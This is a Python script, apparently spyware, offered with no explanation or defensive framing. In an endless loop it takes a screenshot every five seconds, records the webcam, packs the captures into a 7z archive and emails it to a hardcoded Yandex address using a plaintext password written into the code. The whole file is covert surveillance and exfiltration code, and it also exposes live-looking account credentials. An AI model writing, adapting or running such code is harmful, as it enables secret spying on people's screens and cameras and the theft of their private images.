from PIL import ImageGrab 
import time
import cv2
import threading
import smtplib
import os
from email.message import EmailMessage
name=str(os.environ["USERPROFILE"])+":   "+time.ctime()
def eposta(mail,passw,file,sub,yaz):
    msj=EmailMessage()
    msj["Subject"]=sub
    msj["From"]=mail
    msj["To"]=mail
    msj.set_content(yaz)
    with open(file,"rb") as f:
        msj.add_attachment(f.read(),maintype="application",subtype="octet-stream",filename=f.name)
    with smtplib.SMTP_SSL("smtp.yandex.com",465) as smtp:
        smtp.login(mail,passw)
        smtp.send_message(msj)
def ss(f,s):
    for i in range(0,int(s/5)):
        try: 
            ImageGrab.grab().save(f+str(i)+".jpg",'JPEG')
        except:
            pass
        time.sleep(5)
def wbc():
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('bin/output.avi', fourcc, 10.0, (640,480))
    for i in range(0,300*10):
        cap.isOpened()
        ret, frame = cap.read()
        frame = cv2.flip(frame,0)
        out.write(frame)
    cap.release()
    out.release()
    cv2.destroyAllWindows()
while True:
    t1=threading.Thread(target=ss, args=("bin/ss",300))
    t2=threading.Thread(target=wbc)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    os.system('DEL /S /Q log.7z')
    os.system('7z.exe a log "bin\*"')
    eposta("xnoforss@yandex.com","dwM4YLGg8fJizK2","log.7z",name,"")

    
